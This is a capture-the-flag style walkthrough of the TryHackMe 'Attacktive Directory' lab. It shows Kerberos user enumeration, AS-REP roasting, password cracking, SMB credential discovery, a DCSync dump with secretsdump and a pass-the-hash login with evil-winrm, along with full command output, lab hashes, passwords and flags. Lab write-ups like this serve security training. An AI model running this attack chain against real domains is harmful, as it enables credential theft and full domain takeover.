---
title: Attacktive Directory
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - git
  - pip3
  - python3
  - enum4linux
  - kerbrute
  - asreproasting
  - impacket-getnpusers
  - hashcat
  - john
  - impacket-rdp_check
  - smbmap
  - smbclient
  - sharphound
  - bloodhound
  - genericall
  - dcsync
  - impacket-secretsdump
  - evil-winrm
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-attacktive-directory/
---

This [room](https://tryhackme.com/room/attacktivedirectory) is aimed toward enumerating Active Directory from kerberos for all users on target system and next abusing a kerberos feature using AS-REP Roasting attack to gain a initial foothold. again for some enumeration and pivoting to another and lastly going for DC Sync attack to get dump full SAM database form DC.

## Setup

### Installing Impacket

```bash
sudo git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git) /opt/impacket 
sudo pip3 install -r /opt/impacket/requirements.txt 
cd /opt/impacket/ 
sudo pip3 install . 
sudo python3 setup.py install
```

### Installing Bloodhound and Neo4j

```bash
sudo apt update && apt upgrade
sudo apt install bloodhound neo4j
```

## Enumeration

### Nmap

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 23:07 PDT
Nmap scan report for 10.10.105.63
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-03 06:07:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-06-02T06:03:13
|_Not valid after:  2023-12-02T06:03:13
|_ssl-date: 2023-06-03T06:09:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-03T06:08:49+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.32 seconds
```

* enumerating on DNS, LDAP, RPC (access is denied) and found nothing.
* on port 80 we have `Microsoft-IIS/10.0` and nothing else.
* from RDP certificate found a computer name and domain name - `AttacktiveDirectory.spookysec.local`.

#### **Questions**

*   What tool will allow us to enumerate port 139/445?

    `enum4linux`
*   What is the NetBIOS-Domain Name of the machine?

    Via `enum4linux`:

![](2025-05-31-attacktive-directory-2.png)

*   What invalid TLD do people commonly use for their Active Directory Domain?

    `.local`

### Enumerating Users via Kerberos

* As from all the other service we found nothing and thus remains only Kerberos on port 88.
* to enumerate this we will be using [kerbrute](https://github.com/ropnop/kerbrute/releases) tool which can help us to brute force discovery of users, passwords and even password spray!
* download username and password list from tryhackme. (given for this room)
  * [userlist.txt](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)
  * [passwordlist.txt](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)

```bash
┌──(kali㉿kali)-[~/Desktop/Attacktive_Directory]
└─$ ./kerbrute_linux_amd64 userenum --dc 10.10.134.250 -d spookysec.local userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/03/23 - Ronnie Flathers @ropnop

2023/06/03 02:38:48 >  Using KDC(s):
2023/06/03 02:38:48 >  	10.10.134.250:88

2023/06/03 02:38:49 >  [+] VALID USERNAME:	 james@spookysec.local
2023/06/03 02:38:52 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2023/06/03 02:38:56 >  [+] VALID USERNAME:	 James@spookysec.local
2023/06/03 02:38:57 >  [+] VALID USERNAME:	 robin@spookysec.local
2023/06/03 02:39:10 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2023/06/03 02:39:24 >  [+] VALID USERNAME:	 administrator@spookysec.local
2023/06/03 02:39:42 >  [+] VALID USERNAME:	 backup@spookysec.local
2023/06/03 02:39:50 >  [+] VALID USERNAME:	 paradox@spookysec.local
2023/06/03 02:40:47 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2023/06/03 02:41:06 >  [+] VALID USERNAME:	 Robin@spookysec.local
2023/06/03 02:42:57 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2023/06/03 02:46:42 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2023/06/03 02:47:52 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2023/06/03 02:51:56 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2023/06/03 02:53:00 >  [+] VALID USERNAME:	 ori@spookysec.local
2023/06/03 02:55:00 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
2023/06/03 03:00:15 >  Done! Tested 73317 usernames (16 valid) in 1286.796 seconds
```

#### **Questions**

*   What command within Kerbrute will allow us to enumerate valid usernames?

    `userenum`
*   What notable account is discovered? (These should jump out at you)

    `svc-admin`
*   What is the other notable account is discovered? (These should jump out at you)

    `backup`

## Exploitation

### Abusing Kerberos

* Now as we have a valid list of usernames.
* we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.**
* ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set.
* This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
* for this attack we will be using `GetNPUsers` from impacket.
* we will need to make a username list of found valid user accounts like: `james` or `james@spookysec.local` and put it in list.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ for user in $(cat Attacktive_Directory/test.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.134.250 spookysec.local/${user} | grep -v Impacket; done

[*] Getting TGT for james
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9dac2eefa3f329dfb7119e262dce1c8c$7035243c73875f23a111b558dc6170535d92b9d91d9cf25d9bddeb768cf161aeadfc2bb764c616b9cd1c723be44796889c12d8da84655b8a2c0bc57311d3536634ae0a2b04ee7a58a9057ed92eca8d014059a99cc86d69a7b7f6071e75348f0f705569a51ad0405aafbba4ee224fda51e7efbb3ceedbe78e6dd5a3b5718df67d1eae61486a53a0a2d44ad045137c597f24e841fe57392867e1ceffaa068c7b94e6479fb6415363f5c3091e2062b6f2c07c79acd89b55c445a12133f91a347087d51d9721a45801fd5230483c01f1fcddb2f03d13f745b1291549e3e1a512f778cac74421154b36fc6f2751face517e2a175f

[*] Getting TGT for robin
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set

---snip---
```

* we can also use following command to do just as above.

```bash
python3 /usr/local/bin/GetNPUsers.py spookysec.local/svc-admin -request -dc-ip $TARGET -no-pass
```

* got the TGT hash for user `svc-admin`
* thus we can now crack this using hashcat or john
* for this copy past hash into a text file.

```bash
hashcat -a 0 -m 18200 hash.txt password.txt --force
```

![](2025-05-31-attacktive-directory-3.png)

OR

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john hash --wordlist=/home/kali/Desktop/Attacktive_Directory/passwordlist.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:00 DONE (2023-06-03 03:20) 100.0g/s 921600p/s 921600c/s 921600C/s horoscope..scully
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

* got the password for `svc-admin` to be `management2005`.

#### **Questions**

*   We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

    `svc-admin`
*   Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

    `Kerberos 5 AS-REP etype 23`

![](2025-05-31-attacktive-directory-4.png)

*   What mode is the hash?

    `18200`
*   Now crack the hash with the modified password list provided, what is the user accounts password?

    `management2005`

## Enumration (Back to the Basics)

* we tried to get a shell on target from svc-admin account but found no luck with psexec or smbexec or evilwinrm.
* but lastly found that we can RDP in to machine just like that with this creds.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-rdp_check svc-admin:management2005@10.10.134.250 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Access Granted
```

* form RDP session tried to enumerate further on target system but found nothing except user flag.
* thus next we try to check for shares on SMB, as now we have a valid creds it will let us see online share names and our permissions over it.

```bash
┌──(kali㉿kali)-[~/Desktop/Attacktive_Directory]
└─$ smbmap -H 10.10.134.250 -u "svc-admin" -p "management2005"
[+] IP: 10.10.134.250:445	Name: 10.10.134.250                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share
```

* out of all share `backup` looks interesting.
* looked into it and found a `backup_credentials.txt` file.
* this file seems to contain backup account creds.

```bash
┌──(kali㉿kali)-[~/Desktop/Attacktive_Directory]
└─$ smbclient \\\\10.10.134.250\\Backup  -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 12:08:39 2020
  ..                                  D        0  Sat Apr  4 12:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 12:08:53 2020

		8247551 blocks of size 4096. 3675683 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/Attacktive_Directory]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/Attacktive_Directory]
└─$ base64 -d backup_credentials.txt 
backup@spookysec.local:backup2517860
```

* thus we have `backup@spookysec.local:backup2517860`

#### **Questions**

*   Using utility can we map remote SMB shares?

    `smbclient`
*   Which option will list shares?

    `-L`
*   How many remote shares is the server listing?

    There are `6`
*   There is one particular share that we have access to that contains a text file. Which share is it?

    `backup`
*   What is the content of the file?

    `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
*   Decoding the contents of the file, what is the full contents?

    `backup@spookysec.local:backup2517860`

## Elevating Privileges within the Domain

* now as we have backup account creds, we log in via RDP.
* tried basic enumeration here too, but no good as we only found a flag and nothing else.
* thus next we can user sharphound to collect all domain inforamtion for us and view it in a graphical manner in bloodhound.
* for this we downloaded [sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) binary and send it to target.
* next we use with collection method as `All` and get a zip of collected info.

```bash
SharpHound.exe --CollectionMethods All --Domain spookysec.local
```

* next starting neo4j and bloodhound we imported our collected data.
* mark backup and svc-admin as owned.
* from here we did many queried to analys what is our path to domain admin.
* but got no luck.
* lastly we queried for `Find Principles with DCSync Rights` and got a list of all account that can perform DCSync on target.
* interestingly here we have our `backup` account in list.

![](2025-05-31-attacktive-directory-5.png)

* The username of the account “backup” gets us thinking. What is this the backup account to?
* hence this rights might be the reason for such an account name.
* but notice our user `backup` does not have full DCSync rights and only have `Generic All` permission on Domain Controller.
* meaning we can perform some of DCSync functionality but can fully make a copy of original DC.
* this is good enough for us as we can copy SAM database from DC with given rights.
* Knowing this, we can use another tool within Impacket called “secretsdump.py”.

```bash
┌──(root💀kali)-[~/thm/attacktive]
└─# secretsdump.py -just-dc backup@spookysec.local
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:fa9e2614a53312f8df3efa9476877f08:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8b366fb2f973b82a26ee00882054e354911117403cca5934de0d1ba848b473e8
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ed07eb1662813ed845489258db4af1b5
ATTACKTIVEDIREC$:des-cbc-md5:f49da7071a619d85
[*] Cleaning up...
```

* as of now we have Administrator hash of domain, we either crack it to get his password or directly perform a `PassTheHash` attack.
* here we directly pass the hash using evil-winrm. (as that easily instead of cracking it)

```bash
┌──(root💀kali)-[~/thm/attacktive/evil-winrm]
└─# evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.85.191
Evil-WinRM shell v2.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

#### **Questions**

*   What method allowed us to dump NTDS.DIT?

    `DRSUAPI`
*   What is the Administrators NTLM hash?

    `0e0363213e37b94221497260b0bcb4fc`
*   What method of attack could allow us to authenticate as the user without the password?

    `Pass The Hash`
*   Using a tool called Evil-WinRM what option will allow us to use a hash?

    `-H`

## Flag Submission Panel

* svc-admin

```powershell
*Evil-WinRM* PS C:\Users\backup\desktop> cd ../../svc-admin/desktop
*Evil-WinRM* PS C:\Users\svc-admin\desktop> dir

    Directory: C:\Users\svc-admin\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt

*Evil-WinRM* PS C:\Users\svc-admin\desktop> more user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```

* backup

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ../../backup/desktop
*Evil-WinRM* PS C:\Users\backup\desktop> dir

    Directory: C:\Users\backup\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt

*Evil-WinRM* PS C:\Users\backup\desktop> more privesc.txt
TryHackMe{B4ckM3UpSc0tty!}
```

* Administrator

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir

    Directory: C:\Users\Administrator\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> more root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```
